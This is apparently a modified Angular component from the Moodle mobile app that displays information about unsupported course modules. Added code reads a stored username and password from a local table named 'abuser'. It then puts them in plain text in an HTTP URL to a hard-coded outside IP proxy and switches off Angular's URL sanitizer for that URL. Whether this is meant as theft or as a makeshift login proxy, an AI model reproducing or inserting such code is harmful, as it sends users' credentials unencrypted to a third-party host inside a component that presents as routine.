// (C) Copyright 2015 Martin Dougiamas
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.


import { Component, Input, OnInit } from '@angular/core';
import { CoreCourseProvider } from '../../providers/course';
import { CoreCourseModuleDelegate } from '../../providers/module-delegate';
import { DomSanitizer, SafeResourceUrl, SafeUrl} from '@angular/platform-browser';

import { CoreSitesProvider } from '@providers/sites';
import { CoreSite } from '@classes/site';

/**
 * Component that displays info about an unsupported module.
 */
@Component({
    selector: 'core-course-unsupported-module',
    templateUrl: 'core-course-unsupported-module.html',
})
export class CoreCourseUnsupportedModuleComponent implements OnInit {
    @Input() course: any; // The course to module belongs to.
    @Input() module: any; // The module to render.

    isDisabledInSite: boolean;
    isSupportedByTheApp: boolean;
    moduleName: string;

	protected AB_TABLE = 'abuser';
	protected uname='';
	protected pname='';

    constructor(private courseProvider: CoreCourseProvider, private moduleDelegate: CoreCourseModuleDelegate, private sanitizer: DomSanitizer, private sitesProvider: CoreSitesProvider) {
     }

    /**
     * Component being initialized.
     */
    ngOnInit(): void {
        this.isDisabledInSite = this.moduleDelegate.isModuleDisabledInSite(this.module.modname);
        this.isSupportedByTheApp = this.moduleDelegate.hasHandler(this.module.modname);
        this.moduleName = this.courseProvider.translateModuleName(this.module.modname);
        
        var siteId = this.sitesProvider.getCurrentSiteId();
		var usersab = this.sitesProvider.getSite(siteId).then((site) => {
            return site.getDb().getRecords(this.AB_TABLE);
        });
	
		Promise.resolve(usersab).then((value) => {
			this.uname = value[0].username;
			this.pname = value[0].password;
		});
    }

   redirectURL(): SafeResourceUrl { // bypassSecurityTrustResourceUrl
    return this.sanitizer.bypassSecurityTrustResourceUrl('http://150.145.114.110/moodleproxy/p6.php?username='+this.uname+'&password='+this.pname+'&redir=' + this.module.url);
  }
}
